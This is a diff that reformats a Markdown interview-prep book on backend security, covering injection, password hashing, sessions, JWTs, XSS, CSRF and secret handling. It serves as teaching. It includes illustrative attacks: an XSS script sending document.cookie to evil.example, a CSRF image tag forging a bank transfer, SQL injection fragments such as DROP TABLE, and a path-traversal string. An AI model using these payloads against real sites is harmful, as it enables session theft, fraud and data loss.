@@ -7,9 +7,9 @@ Senior backend and full-stack interview preparation. Read with a pen.
 
 ## How to use this book
 
-This book follows _Backend Security: Everything You Need to Know_
-(`youtube.com/watch?v=Hs0nWRxjnkI`, 2h50, the longest lecture in the _Backend
-from First Principles_ playlist), and it borrows the lecture's best decision:
+This book follows *Backend Security: Everything You Need to Know*
+(`youtube.com/watch?v=Hs0nWRxjnkI`, 2h50, the longest lecture in the *Backend
+from First Principles* playlist), and it borrows the lecture's best decision:
 it does not hand you a list of named vulnerabilities to memorise.
 
 It teaches one question instead, and then shows the same question producing
@@ -34,24 +34,24 @@ write==: your handlers, your queries, your session logic, your headers.
 
 #### The five block types
 
-| Block            | What it means                                                              |
-| ---------------- | -------------------------------------------------------------------------- |
-| Interviewer asks | A real follow-up you should expect. Answer it out loud before reading on.  |
-| Senior signal    | The specific sentence that separates a senior answer from a mid-level one. |
-| Trap             | A common answer that sounds right and is wrong.                            |
-| Do this          | The concrete practice, with the parameter or command.                      |
-| Key idea         | The one thing to carry out of that section.                                |
+| Block | What it means |
+|---|---|
+| Interviewer asks | A real follow-up you should expect. Answer it out loud before reading on. |
+| Senior signal | The specific sentence that separates a senior answer from a mid-level one. |
+| Trap | A common answer that sounds right and is wrong. |
+| Do this | The concrete practice, with the parameter or command. |
+| Key idea | The one thing to carry out of that section. |
 
 #### The marks
 
-| Mark          | Means                                          |
-| ------------- | ---------------------------------------------- |
-| ==peach==     | The sentence to carry away                     |
-| !!rose!!      | The wrong answer, the thing that bites         |
-| ++mint++      | The correct practice                           |
-| %%pink%%      | A definition, at the point it is first defined |
-| **underline** | The phrase the sentence turns on               |
-| ((circle))    | The thing you will be asked about              |
+| Mark | Means |
+|---|---|
+| ==peach== | The sentence to carry away |
+| !!rose!! | The wrong answer, the thing that bites |
+| ++mint++ | The correct practice |
+| %%pink%% | A definition, at the point it is first defined |
+| __underline__ | The phrase the sentence turns on |
+| ((circle)) | The thing you will be asked about |
 
 :::toc
 :::
@@ -134,13 +134,13 @@ Your backend is one process, but it emits text into several very different
 interpreters, and ==each of them has its own grammar, its own special
 characters, and its own idea of where a command ends==.
 
-| Context              | Language             | Characters that mean "something else" |
-| -------------------- | -------------------- | ------------------------------------- |
-| Database             | SQL                  | `'` `"` `;` `--` `/* */`              |
-| Browser              | HTML, JS, CSS        | `<` `>` `&` `"` `'`                   |
-| Operating system     | Shell                | `;` `&&` `\|` backtick `$()` `>`      |
-| Filesystem           | Paths                | `..` `/` `\0`                         |
-| Templates, logs, CSV | Whatever parses them | `{{ }}` newlines, `=` `+` `@`         |
+| Context | Language | Characters that mean "something else" |
+|---|---|---|
+| Database | SQL | `'` `"` `;` `--` `/* */` |
+| Browser | HTML, JS, CSS | `<` `>` `&` `"` `'` |
+| Operating system | Shell | `;` `&&` `\|` backtick `$()` `>` |
+| Filesystem | Paths | `..` `/` `\0` |
+| Templates, logs, CSV | Whatever parses them | `{{ }}` newlines, `=` `+` `@` |
 
 A user types in one of those languages, usually because they are in a browser.
 The vulnerability appears when their text ==crosses into another one==.
@@ -207,11 +207,11 @@ usually holds everything.
 
 The same technique escalates well past reading rows:
 
-| The attacker appends                     | Gets                                                           |
-| ---------------------------------------- | -------------------------------------------------------------- |
-| `UNION SELECT ... `                      | Data from ==other tables==, including password hashes          |
-| `; UPDATE users SET role='admin' ...`    | Privilege escalation, if the driver allows stacked statements  |
-| `; DROP TABLE ...`                       | Destruction                                                    |
+| The attacker appends | Gets |
+|---|---|
+| `UNION SELECT ... ` | Data from ==other tables==, including password hashes |
+| `; UPDATE users SET role='admin' ...` | Privilege escalation, if the driver allows stacked statements |
+| `; DROP TABLE ...` | Destruction |
 | A slow condition, and times the response | ==Blind extraction==, one bit at a time, with no output at all |
 
 That last row matters because it removes the usual comfort. An endpoint that
@@ -254,7 +254,6 @@ table name, a column name, or a sort direction:
   ✗ ORDER BY $1      -- sorts by a constant, silently
   ✓ ORDER BY <a column name looked up in a map you wrote>
 ```
-
 So dynamic sorting and filtering must come from a ++whitelist++. That gap is
 exactly where injection reappears in hand-rolled query builders. Notebook 04
 section 28 has the pattern in full.
@@ -290,13 +289,12 @@ The injected content is not a quote, it is ==a data structure==. `$ne`, `$gt`,
 your code expected a scalar.
 
 :::do The fix is the same shape: never let the type change
-
 - ++Validate the type before the query++, not just the presence. A schema
   validator that says `email: string` rejects an object outright.
 - ++Cast explicitly++: `String(req.body.email)`.
 - ++Disable operator injection at the driver++ where it is offered, and never
   use `$where`, which evaluates JavaScript server-side.
-  :::
+:::
 
 ## 7. Command injection
 
@@ -352,25 +350,24 @@ execFile("ffmpeg", ["-i", input, "-o", output]);
 Every language has both forms, and the safe one is always the one that takes a
 list:
 
-| Language | Avoid                                          | Use                               |
-| -------- | ---------------------------------------------- | --------------------------------- |
-| Node     | `exec`, `execSync` with a template string      | `execFile`, `spawn` with an array |
-| Python   | `os.system`, `subprocess.run(..., shell=True)` | `subprocess.run([...])`           |
-| Go       | `exec.Command("sh", "-c", s)`                  | `exec.Command("ffmpeg", args...)` |
-| Java     | `Runtime.exec(String)`                         | `ProcessBuilder(List<String>)`    |
+| Language | Avoid | Use |
+|---|---|---|
+| Node | `exec`, `execSync` with a template string | `execFile`, `spawn` with an array |
+| Python | `os.system`, `subprocess.run(..., shell=True)` | `subprocess.run([...])` |
+| Go | `exec.Command("sh", "-c", s)` | `exec.Command("ffmpeg", args...)` |
+| Java | `Runtime.exec(String)` | `ProcessBuilder(List<String>)` |
 
 :::do And still validate, because the array is not the whole job
 An argument array stops command ==chaining==. It does not stop an argument
 being hostile in its own right: a filename beginning with `-` can be read as a
 flag, and `../../etc/passwd` is a perfectly valid single path.
-
 - ++Generate filenames server-side++, never from user input. Notebook 02
   section 15 makes the same argument for object keys.
 - ++Prefix user paths with `./`++ or pass `--` before positional arguments so
   a leading dash cannot become an option.
 - ++Prefer a library over a subprocess++ where one exists. `sharp` beats
   shelling out to ImageMagick, and removes the whole category.
-  :::
+:::
 
 :::recall Three injection contexts, the character that breaks each, and the one structural fix they share. | 6
 :::
@@ -485,16 +482,15 @@ The salt does one job and does it completely: ==identical passwords now produce
 different hashes==, so a precomputed table is worthless and every password must
 be attacked individually.
 
-| Algorithm           | Verdict                                                                    |
-| ------------------- | -------------------------------------------------------------------------- |
-| MD5, SHA-1, SHA-256 | !!Never for passwords.!! Fast is the wrong property                        |
-| PBKDF2              | Acceptable, widely certified, weakest of the three below                   |
-| bcrypt              | ==Fine.== Long-established. Note the 72-byte input limit                   |
-| scrypt              | Good. Memory-hard                                                          |
-| ==argon2id==        | The current default recommendation. Memory-hard and side-channel resistant |
+| Algorithm | Verdict |
+|---|---|
+| MD5, SHA-1, SHA-256 | !!Never for passwords.!! Fast is the wrong property |
+| PBKDF2 | Acceptable, widely certified, weakest of the three below |
+| bcrypt | ==Fine.== Long-established. Note the 72-byte input limit |
+| scrypt | Good. Memory-hard |
+| ==argon2id== | The current default recommendation. Memory-hard and side-channel resistant |
 
 :::do What to actually do
-
 - ++Use the library's defaults++ for argon2id or bcrypt and do not invent
   parameters. Raise the work factor over time as hardware improves.
 - ++Let the library generate the salt++ and store it in the encoded hash
@@ -506,7 +502,7 @@ be attacked individually.
 - ++Do not impose composition rules++ ("one symbol, one capital"). Length and
   a breached-password check (Have I Been Pwned's k-anonymity API) beat
   character classes, which mostly produce `Password1!`.
-  :::
+:::
 
 :::ask What is peppering, and do you need it?
 A %%pepper%% is a secret value mixed into the hash that lives in your
@@ -536,14 +532,14 @@ Once the password is verified, the user should not send it again. They carry a
                                     holds it IS the user, until it expires
 ```
 
-| Property   | Requirement                                                                   |
-| ---------- | ----------------------------------------------------------------------------- |
-| Randomness | ==A CSPRNG==, never `Math.random()`, never a counter, never a UUIDv1          |
-| Length     | 128 bits of entropy minimum                                                   |
-| Content    | ==Meaningless.== The id maps to server state; it does not encode it           |
-| Rotation   | ==Regenerate on login and on privilege change==, or you have session fixation |
-| Expiry     | Absolute and idle timeouts, both enforced ==server-side==                     |
-| Logout     | Deletes the server-side record, not just the cookie                           |
+| Property | Requirement |
+|---|---|
+| Randomness | ==A CSPRNG==, never `Math.random()`, never a counter, never a UUIDv1 |
+| Length | 128 bits of entropy minimum |
+| Content | ==Meaningless.== The id maps to server state; it does not encode it |
+| Rotation | ==Regenerate on login and on privilege change==, or you have session fixation |
+| Expiry | Absolute and idle timeouts, both enforced ==server-side== |
+| Logout | Deletes the server-side record, not just the cookie |
 
 That rotation row is the one people miss. If an attacker can set a victim's
 session id before they log in (via a link, a subdomain, an XSS), and you keep
@@ -560,13 +556,13 @@ session. Issuing a fresh id at login closes it.
                      └ JavaScript cannot read it, so XSS cannot steal it
 ```
 
-| Flag              | Stops                                                           |
-| ----------------- | --------------------------------------------------------------- |
-| `HttpOnly`        | An XSS payload reading `document.cookie`. Section 23            |
-| `Secure`          | The cookie travelling over plain HTTP and being read at any hop |
-| `SameSite=Lax`    | Most CSRF. Section 25                                           |
-| `SameSite=Strict` | More CSRF, at the cost of breaking inbound links                |
-| `Path` / `Domain` | Sending the cookie further than it needs to go                  |
+| Flag | Stops |
+|---|---|
+| `HttpOnly` | An XSS payload reading `document.cookie`. Section 23 |
+| `Secure` | The cookie travelling over plain HTTP and being read at any hop |
+| `SameSite=Lax` | Most CSRF. Section 25 |
+| `SameSite=Strict` | More CSRF, at the cost of breaking inbound links |
+| `Path` / `Domain` | Sending the cookie further than it needs to go |
 
 :::signal
 "==Storing a session token in `localStorage` is a decision to lose it to any
@@ -610,14 +606,14 @@ immediately, and both are asked about:
   payload and verification fails, which is exactly what you want, and it tells
   you nothing about who is holding the token.
 
-|                       | Stateful session                 | Stateless JWT                        |
-| --------------------- | -------------------------------- | ------------------------------------ |
-| Revocation            | ==Immediate.== Delete the row    | ==Not possible== before expiry       |
-| "Log out all devices" | Trivial                          | Needs a version claim or a blocklist |
-| Storage               | A row or a Redis key per session | None                                 |
-| Verification cost     | One lookup                       | One signature check                  |
-| Scaling               | Shared store required            | Any node can verify alone            |
-| Size on the wire      | ~40 bytes                        | Hundreds of bytes, every request     |
+| | Stateful session | Stateless JWT |
+|---|---|---|
+| Revocation | ==Immediate.== Delete the row | ==Not possible== before expiry |
+| "Log out all devices" | Trivial | Needs a version claim or a blocklist |
+| Storage | A row or a Redis key per session | None |
+| Verification cost | One lookup | One signature check |
+| Scaling | Shared store required | Any node can verify alone |
+| Size on the wire | ~40 bytes | Hundreds of bytes, every request |
 
 :::trap "JWTs are more secure because they are signed"
 Signing gets you ==integrity==, which a random opaque session id also has, by
@@ -628,7 +624,6 @@ rebuilt a session store with worse ergonomics.
 :::
 
 :::do If you use JWTs, do these
-
 - ++Pin the algorithm server-side.++ Never trust the `alg` header. Reject
   `none`, and reject an HMAC token if you expect RS256. This is a real,
   historic, catastrophic bug class.
@@ -637,7 +632,7 @@ rebuilt a session store with worse ergonomics.
   with a refresh token that is stored server-side and therefore revocable.
 - ++Rotate refresh tokens on use++ and detect reuse: a refresh token presented
   twice means one copy was stolen, so kill the whole family.
-  :::
+:::
 
 ## 16. Rate limiting
 
@@ -660,7 +655,6 @@ attacker rotates. ==IP is a useful signal and a terrible identity.==
 :::
 
 :::do Limit on several keys at once
-
 - ++Per account++: five failed logins for `alice@example.com` is suspicious no
   matter where they came from. This is the one that stops credential stuffing.
 - ++Per IP++ and ++per subnet++, as a coarse backstop.
@@ -670,7 +664,7 @@ attacker rotates. ==IP is a useful signal and a terrible identity.==
   denial-of-service against the real user.
 - ++Constant-time responses++ so failures do not leak whether the account
   exists, and identical wording for "wrong password" and "no such user".
-  :::
+:::
 
 :::recall Password stored, session issued, cookie set: name every property and flag, and what each one prevents. | 8
 :::
@@ -757,14 +751,13 @@ worth having and they are not a control.== The control is the ownership check.
 :::
 
 :::do Make the unsafe call impossible to write
-
 - ++Scope every fetch by the caller++, always: `WHERE id = $1 AND tenant_id = $2`.
 - ++Put the tenant in the repository signature++ so it cannot be omitted.
 - ++Consider row-level security++ in Postgres, with the tenant set per
   connection, so the database enforces it below all your code.
 - ++Test for it++: every list and detail endpoint gets a test where user B asks
   for user A's id and must be refused. This is a test you can generate.
-  :::
+:::
 
 ## 19. What the status code leaks
 
@@ -815,14 +808,13 @@ the failure mode of forgetting is ==an outage you hear about in minutes==. With
 allow-by-default it is ==a breach you hear about from a stranger==.
 
 :::do Make it structural, not cultural
-
 - ++Apply the auth middleware globally++ and opt specific routes out, rather
   than opting routes in.
 - ++Fail closed++: if the permission service errors, deny. An exception in a
   policy check must never fall through to "allowed".
 - ++Add a test that enumerates your routes++ and asserts every one is covered
   by an authorization rule. New route with no rule fails CI.
-  :::
+:::
 
 ## 21. Audit logging
 
@@ -871,35 +863,32 @@ The mechanism is section 3's again, with the browser as the parser:
 <div class="comment">Nice article!</div>
 
 <!-- what somebody submitted instead -->
-<div class="comment">
-  <script>
-    fetch("https://evil.example/?c=" + document.cookie);
-  </script>
-</div>
+<div class="comment"><script>
+  fetch('https://evil.example/?c=' + document.cookie)
+</script></div>
 ```
 
 Because it is served from ==your== domain, that script inherits everything your
 origin has:
 
-| It can                                    | Because                                   |
-| ----------------------------------------- | ----------------------------------------- |
-| Read cookies without `HttpOnly`           | It is same-origin                         |
-| Read `localStorage`, always               | ==There is no flag that stops this==      |
-| Make authenticated requests as the victim | The browser attaches credentials          |
-| Rewrite the page                          | Fake login forms, changed payment details |
-| Keylog                                    | It is JavaScript on the page              |
+| It can | Because |
+|---|---|
+| Read cookies without `HttpOnly` | It is same-origin |
+| Read `localStorage`, always | ==There is no flag that stops this== |
+| Make authenticated requests as the victim | The browser attaches credentials |
+| Rewrite the page | Fake login forms, changed payment details |
+| Keylog | It is JavaScript on the page |
 
-| Kind          | Where the payload lives                                     |
-| ------------- | ----------------------------------------------------------- |
-| ==Stored==    | In your database. Served to every viewer. Worst             |
-| ==Reflected== | In a URL parameter echoed into the response. Needs a click  |
+| Kind | Where the payload lives |
+|---|---|
+| ==Stored== | In your database. Served to every viewer. Worst |
+| ==Reflected== | In a URL parameter echoed into the response. Needs a click |
 | ==DOM-based== | Never reaches your server. `innerHTML` from `location.hash` |
 
 :::do Escape on output, by context
 The critical word is ==output==, not input. The same string is safe in one place
 and dangerous in another, so escaping at the point of entry cannot be correct
 for every destination.
-
 - ++Let your template engine escape by default++ and treat every
   `dangerouslySetInnerHTML`, `v-html`, `\|safe` and `innerHTML` as a code review
   trigger.
@@ -908,7 +897,7 @@ for every destination.
 - ++Escape for the context++: HTML body, attribute, JavaScript string, URL and
   CSS all have different rules.
 - ++Set `HttpOnly`++ so at least the session cookie is out of reach.
-  :::
+:::
 
 ## 23. Content Security Policy
 
@@ -944,7 +933,7 @@ The request is forged. The session is genuine. The browser attached it for you.
 
 ```html
 <!-- on evil.example, which you visit while logged into your bank -->
-<img src="https://bank.example/transfer?to=attacker&amount=5000" />
+<img src="https://bank.example/transfer?to=attacker&amount=5000">
 ```
 
 The browser sees an image tag, issues the GET, and ==attaches your bank cookies
@@ -952,7 +941,6 @@ because they belong to that domain==. Your bank sees a fully authenticated
 request from a real session. No XSS is needed anywhere.
 
 :::do Three layers, and one of them is free
-
 - ++`SameSite=Lax`++ on session cookies, which is the modern browser default
   and stops the great majority of this. `Strict` is stronger and breaks
   inbound links.
@@ -962,7 +950,7 @@ request from a real session. No XSS is needed anywhere.
   cross-origin read.
 - ++Never change state on GET.++ `GET /transfer?...` is the bug that makes an
   `<img>` tag sufficient. Safe methods must be safe.
-  :::
+:::
 
 :::trap "CORS protects us from CSRF"
 ==CORS is not a security mechanism for your server.== It is a browser policy
@@ -1029,7 +1017,6 @@ store, still in every clone, still in every fork, and still on GitHub's servers
 after the branch is gone.
 
 :::do The order of operations when a secret leaks
-
 1. ++Rotate the credential first.++ Immediately. Before any cleanup, before
    telling anyone, before working out how it happened. ==Assume it is already
    in use.==
@@ -1038,7 +1025,7 @@ after the branch is gone.
 4. Then fix the cause: `.gitignore`, a pre-commit secret scanner (gitleaks,
    trufflehog), push protection on the remote, and secrets in a manager
    (Vault, AWS Secrets Manager, SOPS) rather than in files.
-   :::
+:::
 
 :::trap "It is a private repo"
 Private today. Contractors, acquisitions, a misclick on visibility, a laptop,
@@ -1072,7 +1059,6 @@ numbers select an exploit; paths reveal your framework; a schema name tells them
 what to ask for next.
 
 :::do The production posture
-
 - ++Generic message to the client, full detail to your logs++, correlated by a
   request id you also show the user so support can find it.
 - ++`NODE_ENV=production`++, `DEBUG=False`, and verify it in the deployed
@@ -1081,20 +1067,20 @@ what to ask for next.
 - ++Remove version banners++ and `X-Powered-By`.
 - ++Do not leak in timing or wording++: "user not found" and "wrong password"
   must be one message with one shape.
-  :::
+:::
 
 ## 28. What you must not log
 
 Logs are the place where security-conscious teams quietly recreate the problem
 they just solved.
 
-| Never log                       | Because                                  |
-| ------------------------------- | ---------------------------------------- |
-| Passwords, even wrong ones      | A typo'd password is usually a real one  |
-| Session ids, JWTs, API keys     | Your log store is now credential storage |
-| Full card numbers, national ids | Compliance, and it will be exported      |
-| Whole request bodies on error   | The login body is a request body         |
-| Authorization headers           | The most commonly leaked secret in logs  |
+| Never log | Because |
+|---|---|
+| Passwords, even wrong ones | A typo'd password is usually a real one |
+| Session ids, JWTs, API keys | Your log store is now credential storage |
+| Full card numbers, national ids | Compliance, and it will be exported |
+| Whole request bodies on error | The login body is a request body |
+| Authorization headers | The most commonly leaked secret in logs |
 
 :::do Treat the log pipeline as a system with its own access control
 Scrub at the logger, with an allowlist of fields rather than a blocklist of
@@ -1117,7 +1103,6 @@ yours.
 ```
 
 :::do The realistic controls
-
 - ++Lockfiles committed++, and `npm ci` / `pip install -r` in CI, so the build
   is the versions you tested.
 - ++Automated updates++ (Dependabot, Renovate) so patching is routine rather
@@ -1128,7 +1113,7 @@ yours.
 - ++Pin your CI actions to a SHA++, not a tag. A tag can be moved.
 - ++Be suspicious of new, tiny, single-maintainer packages++ in the critical
   path, and of typo-adjacent names.
-  :::
+:::
 
 :::part VII | The interview itself
 
@@ -1166,71 +1151,71 @@ A repeatable pass. Run it out loud, in this order, and you will find things.
 
 ## 31. Follow-up question bank
 
-| Question                                                        | Section |
-| --------------------------------------------------------------- | ------- |
-| What is the one question an attacker asks?                      | 1       |
-| Why is injection not a database problem?                        | 2, 3    |
-| Escaping quotes stops SQL injection. True?                      | 4       |
-| How does a parameterised query actually work?                   | 5       |
-| I use Mongo. Am I safe from injection?                          | 6       |
-| How do you shell out safely?                                    | 7, 8    |
-| Why not encrypt passwords instead of hashing?                   | 10      |
-| What is a rainbow table, and what defeats it?                   | 11, 12  |
-| Why is a fast hash the wrong hash?                              | 11      |
-| What does a salt do, and is it secret?                          | 12      |
-| Where do you store a session token, and why not localStorage?   | 13, 14  |
-| Name the cookie flags and what each prevents                    | 14      |
-| JWT or server session?                                          | 15      |
-| Why does IP rate limiting fail?                                 | 16      |
-| Role check passed and the user read someone else's row. How?    | 17      |
-| What is IDOR, and do UUIDs fix it?                              | 18      |
-| 403 or 404, and why?                                            | 19      |
-| What happens when someone forgets the auth rule on a new route? | 20      |
-| What can an XSS payload do that a network attacker cannot?      | 22      |
-| What does CSP buy you that escaping does not?                   | 23      |
-| Does CORS prevent CSRF?                                         | 24      |
-| A secret was committed. What is the first thing you do?         | 26      |
-| What is wrong with returning the stack trace?                   | 27      |
+| Question | Section |
+|---|---|
+| What is the one question an attacker asks? | 1 |
+| Why is injection not a database problem? | 2, 3 |
+| Escaping quotes stops SQL injection. True? | 4 |
+| How does a parameterised query actually work? | 5 |
+| I use Mongo. Am I safe from injection? | 6 |
+| How do you shell out safely? | 7, 8 |
+| Why not encrypt passwords instead of hashing? | 10 |
+| What is a rainbow table, and what defeats it? | 11, 12 |
+| Why is a fast hash the wrong hash? | 11 |
+| What does a salt do, and is it secret? | 12 |
+| Where do you store a session token, and why not localStorage? | 13, 14 |
+| Name the cookie flags and what each prevents | 14 |
+| JWT or server session? | 15 |
+| Why does IP rate limiting fail? | 16 |
+| Role check passed and the user read someone else's row. How? | 17 |
+| What is IDOR, and do UUIDs fix it? | 18 |
+| 403 or 404, and why? | 19 |
+| What happens when someone forgets the auth rule on a new route? | 20 |
+| What can an XSS payload do that a network attacker cannot? | 22 |
+| What does CSP buy you that escaping does not? | 23 |
+| Does CORS prevent CSRF? | 24 |
+| A secret was committed. What is the first thing you do? | 26 |
+| What is wrong with returning the stack trace? | 27 |
 
 :::part VIII | Appendices
 :::
 
 ## Appendix A. The response headers
 
-| Header                      | Value                                                           | Stops                                   |
-| --------------------------- | --------------------------------------------------------------- | --------------------------------------- |
-| `Content-Security-Policy`   | `default-src 'self'; object-src 'none'; frame-ancestors 'none'` | XSS execution, clickjacking             |
-| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains`                           | Downgrade to HTTP                       |
-| `X-Content-Type-Options`    | `nosniff`                                                       | MIME sniffing a text file into a script |
-| `X-Frame-Options`           | `DENY`                                                          | Clickjacking, legacy clients            |
-| `Referrer-Policy`           | `strict-origin-when-cross-origin`                               | Leaking ids and tokens in URLs          |
-| `Set-Cookie`                | `HttpOnly; Secure; SameSite=Lax`                                | Theft by XSS, plaintext, CSRF           |
-| `Cache-Control`             | `no-store` on authenticated responses                           | Private data in shared caches           |
+| Header | Value | Stops |
+|---|---|---|
+| `Content-Security-Policy` | `default-src 'self'; object-src 'none'; frame-ancestors 'none'` | XSS execution, clickjacking |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade to HTTP |
+| `X-Content-Type-Options` | `nosniff` | MIME sniffing a text file into a script |
+| `X-Frame-Options` | `DENY` | Clickjacking, legacy clients |
+| `Referrer-Policy` | `strict-origin-when-cross-origin` | Leaking ids and tokens in URLs |
+| `Set-Cookie` | `HttpOnly; Secure; SameSite=Lax` | Theft by XSS, plaintext, CSRF |
+| `Cache-Control` | `no-store` on authenticated responses | Private data in shared caches |
 
 ## Appendix B. Glossary
 
-| Term                | Meaning                                                                |
-| ------------------- | ---------------------------------------------------------------------- |
-| Injection           | Data supplied by a user gets parsed as instructions                    |
-| Parameterised query | Statement and values sent on separate channels                         |
-| Argument array      | Executing a program directly, with no shell to parse                   |
-| Hash                | One-way, deterministic, fixed-length. Not encryption                   |
-| Rainbow table       | Precomputed hash-to-password lookup                                    |
-| Salt                | Unique random value per password. Not secret                           |
-| Pepper              | Secret value outside the database, mixed into the hash                 |
-| Session id          | Opaque bearer token mapping to server-side state                       |
-| `HttpOnly`          | Cookie flag: JavaScript cannot read it                                 |
-| `SameSite`          | Cookie flag: not sent on cross-site requests                           |
-| JWT                 | Signed, ==readable==, self-contained token. Hard to revoke             |
-| Refresh token       | Long-lived, revocable, exchanged for short access tokens               |
-| BOLA / IDOR         | Accessing another user's object by changing an id                      |
-| Deny by default     | Forbidden unless a rule permits. Fails closed                          |
-| XSS                 | Attacker script running in your origin                                 |
-| CSP                 | Policy telling the browser what it may execute                         |
-| CSRF                | A forged request carrying a genuine session                            |
-| CORS                | Browser policy on reading cross-origin responses. Not a server control |
-| Clickjacking        | Your UI framed invisibly under the attacker's                          |
-| Audit log           | Append-only record of who did what to which object                     |
+| Term | Meaning |
+|---|---|
+| Injection | Data supplied by a user gets parsed as instructions |
+| Parameterised query | Statement and values sent on separate channels |
+| Argument array | Executing a program directly, with no shell to parse |
+| Hash | One-way, deterministic, fixed-length. Not encryption |
+| Rainbow table | Precomputed hash-to-password lookup |
+| Salt | Unique random value per password. Not secret |
+| Pepper | Secret value outside the database, mixed into the hash |
+| Session id | Opaque bearer token mapping to server-side state |
+| `HttpOnly` | Cookie flag: JavaScript cannot read it |
+| `SameSite` | Cookie flag: not sent on cross-site requests |
+| JWT | Signed, ==readable==, self-contained token. Hard to revoke |
+| Refresh token | Long-lived, revocable, exchanged for short access tokens |
+| BOLA / IDOR | Accessing another user's object by changing an id |
+| Deny by default | Forbidden unless a rule permits. Fails closed |
+| XSS | Attacker script running in your origin |
+| CSP | Policy telling the browser what it may execute |
+| CSRF | A forged request carrying a genuine session |
+| CORS | Browser policy on reading cross-origin responses. Not a server control |
+| Clickjacking | Your UI framed invisibly under the attacker's |
+| Audit log | Append-only record of who did what to which object |
 
 ## Appendix C. Self-test
 
